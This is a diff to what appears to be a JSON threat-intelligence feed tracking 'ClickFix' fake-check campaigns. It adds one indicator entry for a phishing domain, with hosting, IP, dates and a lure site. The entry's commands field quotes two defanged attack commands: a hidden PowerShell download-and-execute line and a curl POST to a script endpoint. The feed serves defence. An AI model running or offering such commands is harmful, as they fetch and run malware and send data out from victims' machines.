@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 6324,
+ "count": 6325,
  "indicators": [
   {
    "indicator": "06services.it",
@@ -108866,6 +108866,57 @@
     "itwxrsvo.bittu.store"
    ],
    "lure_from": []
+  },
+  {
+   "indicator": "emanfatimatrading.com",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-26",
+   "last_seen": "2026-11-27",
+   "last_online": "2026-11-27",
+   "offline_since": null,
+   "url": "https://www.emanfatimatrading.com/",
+   "brand": null,
+   "product": null,
+   "hosting": "PT Data Kencang Hutama",
+   "dns": "kencang.id",
+   "ip": "195.88.211.170",
+   "asn": "AS214882",
+   "org": "PT Data Kencang Hutama",
+   "country": "ID",
+   "ips": [
+    {
+     "ip": "195.88.211.170",
+     "asn": "AS214882",
+     "org": "PT Data Kencang Hutama",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "www.emanfatimatrading.com",
+     "status": "online",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
+    "curl -sL -d \"POSTDATA\" \"hxxps[:]//script[.]google[.][encoded]\""
+   ],
+   "connects_to": [
+    "fingerprint-veri.info"
+   ],
+   "lure_from": [
+    "interseq.at"
+   ]
   },
   {
    "indicator": "emanueleocchipinti.com",
